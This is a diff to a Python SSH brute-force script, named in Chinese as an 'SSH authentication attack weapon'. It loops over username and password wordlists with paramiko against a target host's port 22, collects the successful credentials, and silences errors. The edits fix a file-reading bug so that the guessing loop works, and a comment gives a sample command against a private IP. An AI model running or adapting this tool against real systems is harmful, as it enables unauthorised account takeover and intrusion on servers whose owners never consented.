@@ -14,20 +14,21 @@ ret['info'] = list()
 UserDic = "user.txt"
 PasswordDic = "pass.txt"
 
-# FIXME
-# python SSH身份认证攻击武器.py --target 10.0.4.148 --user user.txt --pw pass.txt
+
+# 如果本机ssh key已写入远端 authorized_keys，会爆破结果造成干扰
+# python SSH身份认证攻击武器.py --target 10.0.4.159 --user user.txt --pw pass.txt
 def SSHLogin(target, username, password):
     try:
         s = paramiko.SSHClient()
         # 接受不在本地Known_host文件下的主机
         s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        s.connect(target, 22, username, password, timeout=1.5)
+        s.connect(target, 22, username, password, banner_timeout=10, timeout=5, auth_timeout=5)
         s.close()
-        print(("The username is %s and password is %s" % (username, password)))
         ret['status'] = 'success'
         ret['info'].append({'username': username, 'password': password})
     except:
-        traceback.print_exc()
+        # traceback.print_exc()
+        pass
 
 
 def attack():
@@ -55,17 +56,17 @@ def attack():
     else:
         passwordFile = open(options.password, "r")
 
-    print(usernameFile.readlines())
-    print(passwordFile.readlines())
+    # 注意 readlines()后光标应该会位移的，所以不能先执行，要直接赋值，否则再执行一次读取的数据就为空了。
+    usernames = [i.strip('\n') for i in
+                 usernameFile.readlines()]
+    passwords = [i.strip('\n') for i in passwordFile.readlines()]
 
-    print(options.target)
-    # SSHLogin(options.target, "root", "123456")
-    for user in usernameFile.readlines():
-        for passwd in passwordFile.readlines():
-            un = user.strip('\n')
-            pw = passwd.strip('\n')
-            print(un, pw)
-            SSHLogin(options.target, un, pw)
+    for user in usernames:
+        for passwd in passwords:
+            SSHLogin(options.target, user, passwd)
+
+    if not ret['status']:
+        ret['status'] = 'fail'
 
     return json.dumps(ret)
 
